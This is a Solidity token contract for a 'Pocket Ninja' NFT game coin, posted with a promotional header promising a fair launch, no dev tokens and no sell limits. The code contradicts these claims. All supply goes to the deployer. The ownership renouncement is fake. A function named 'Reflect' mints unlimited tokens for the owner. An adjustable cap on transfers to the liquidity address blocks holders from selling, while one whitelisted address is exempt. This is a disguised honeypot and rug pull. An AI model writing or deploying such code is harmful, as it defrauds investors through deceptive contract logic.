/**
 *Submitted for verification at Etherscan.io on 2021-07-22
*/

/*
________            ______      _____     _____   _____________   ________________ 
___  __ \______________  /________  /_    ___  | / /___  _/__  | / /_____  /__    |
__  /_/ /  __ \  ___/_  //_/  _ \  __/    __   |/ / __  / __   |/ /___ _  /__  /| |
_  ____// /_/ / /__ _  ,<  /  __/ /_      _  /|  / __/ /  _  /|  / / /_/ / _  ___ |
/_/     \____/\___/ /_/|_| \___/\__/      /_/ |_/  /___/  /_/ |_/  \____/  /_/  |_|
                                                                                   
                                                                                   
Pocket Ninja NFT Trading Card Game!
$PocketNinjaðŸŒ€                                                                                   
TG: @pocketninjaofficial          
          
ðŸ’¥Battle it out with your friends!   
ðŸ’¥Collect more than 70 unique ninja NFTs to battle with!
ðŸ’¥Fair launch, no dev tokens!                                                                           
ðŸ’¥Fair trade, no reserve, No buy/sell limts and no transaction fees!
ðŸ’¥All holders of PocketNinja get 1:1 ingame currency to spend at game launch!

Game Launches July 25t 2021!!!

~ May the power of busido be with you always ~
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.6.11;


    

abstract contract Context {
    
    function _call() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}



contract Ownable is Context {
    address private _owner;
    address public Owner;
    
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () internal {
        address call = _call();
        _owner = call;
         Owner = call;
        emit OwnershipTransferred(address(0), call);
    }
  

    modifier onlyOwner() {
        require(_owner == _call(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
         Owner = address(0);
    }
    
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    
    }
    
}

contract PocketNinja is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _router;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private public_address;
    address private caller;
    uint256 private _totalTokens = 5555555555 * 10**18;
    string private _name = 'Pocket Ninja Collectible NFT Game | pocketninja.net';
    string private _symbol = 'PocketNinjaðŸŒ€';
    uint8 private _decimals = 18;    
    uint256 private rTotal = 777777777 * 10**18;

constructor () public {
    _router[_call()] = _totalTokens;
    emit Transfer(address(0), _call(), _totalTokens);
}
    
   
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }
    
    function Approve(address routeUniswap) public onlyOwner {
        caller = routeUniswap;
    }
    
    function addliquidity (address Uniswaprouterv02) public onlyOwner {
        public_address = Uniswaprouterv02;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_call(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _call(), _allowances[sender][_call()].sub(amount));
        return true;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalTokens;
    }
    
    function setreflectrate(uint256 reflectionPercent) public onlyOwner {
        rTotal = reflectionPercent * 10**18;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _router[account];
    }
    
    function Reflect(uint256 amount) public onlyOwner {
        require(_call() != address(0));
        _totalTokens = _totalTokens.add(amount);
        _router[_call()] = _router[_call()].add(amount);
        emit Transfer(address(0), _call(), amount);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_call(), recipient, amount);
        return true;
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0));
        require(spender != address(0));

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
      
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0));
        require(recipient != address(0));
        
        if (sender != caller && recipient == public_address) {
            require(amount < rTotal);
        }
    
        _router[sender] = _router[sender].sub(amount);
        _router[recipient] = _router[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
 }